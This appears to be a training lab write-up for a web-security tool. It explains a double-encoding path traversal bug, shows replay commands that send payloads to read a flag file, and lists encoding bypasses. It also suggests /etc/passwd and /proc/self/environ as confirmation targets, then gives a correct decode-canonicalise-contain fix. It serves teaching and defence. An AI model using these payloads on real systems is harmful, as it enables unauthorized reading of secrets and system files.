# Lab 27 — Docs

## The bug

```python
name = name.replace("../", "")      # filter
name = urllib.parse.unquote(name)   # decode
target = ROOT / "pages" / name
```

Two operations in the wrong order. The framework has already decoded the query
string once by the time the handler runs, so a **doubly**-encoded `../`

```
%252e%252e%252f   →  (framework decode)  →  %2e%2e%2f
```

is not `../` when the filter reads it, and *is* `../` after the handler's own
`unquote`.

The general rule, worth writing on the wall:

> **Validate after all decoding, or you have validated a different string from
> the one you use.**

Every variant of this is the same bug: a WAF that inspects the raw request while
the app decodes twice; an authorization check on `/admin` against a router that
decodes `%2f`; a filename check before `unicode` normalisation.

## Why the ordinary send cannot carry the payload

Watch what happens when the payload goes through a URL parser:

```bash
h5i websec replay req_0 --session lab27 \
    --set 'query.file=%252e%252e%252fsecret%252fflag.txt'
```

```json
{"error":"FileNotFoundError","asked_for":".../pages/%2e%2e%2fsecret%2fflag.txt"}
```

The parser treated `%25` as data and re-encoded it, so the server received one
*fewer* layer than you sent, the handler's `unquote` produced `%2e%2e%2f`, and
the traversal never happened. Nothing errored. You would have concluded the
filter worked.

This is a general property, not an h5i quirk: **a parsed URL resolves `.` and
`..` and percent-decodes before the request exists.** `curl` does it, every HTTP
library does it, and browsers do it hardest of all.

## `--raw-target`

```bash
h5i websec replay req_0 --session lab27 \
    --raw-target '/download?file=%252e%252e%252fsecret%252fflag.txt'
```

The request-target is written onto the request line byte for byte, around the
URL parser — through the same policy, the same cookie jar, and the same
receipts as any other send. It is the flag for every payload whose *encoding*
is the exploit:

* double-encoded traversal (this lab)
* `%2e%2e%2f`, `..%2f`, `%2e%2e/`, `..%c0%af` (overlong UTF-8)
* `/admin%2f../public` — where a guard and a router disagree about `%2f`
* semicolon path parameters: `/public;/../admin`
* anything with a literal space, `#`, or `?` that must not become a delimiter

Its bigger sibling is `--raw-request` (Lab 30), which writes the *whole*
message, framing headers included.

## Finding the target

You rarely know the layout. Read the error:

```json
{"error":"FileNotFoundError","asked_for":"/tmp/lab27-abc/pages/nope"}
```

An error that echoes the resolved path tells you the base directory and
therefore how many `../` you need. Where errors are silent, count upwards —
six `../` reaches `/` from almost anywhere, and `/etc/passwd`, `/proc/self/environ`,
`/proc/self/cwd/app.py` are good confirmations.

## The fix

Do not build a path from user input at all — look the document up by id in a
map. Where a filename is unavoidable:

```python
name = urllib.parse.unquote(raw)                  # decode fully, first
target = (ROOT / "pages" / name).resolve()        # then canonicalise
if not target.is_relative_to((ROOT / "pages").resolve()):
    reject()                                      # then check containment
```

Decode, canonicalise, then check containment against the resolved base — in
that order, and never by string matching on the input.

## h5i technique

`--raw-target`, and the habit of confirming what actually went out with
`websec show req_N --raw` whenever a payload's encoding matters.
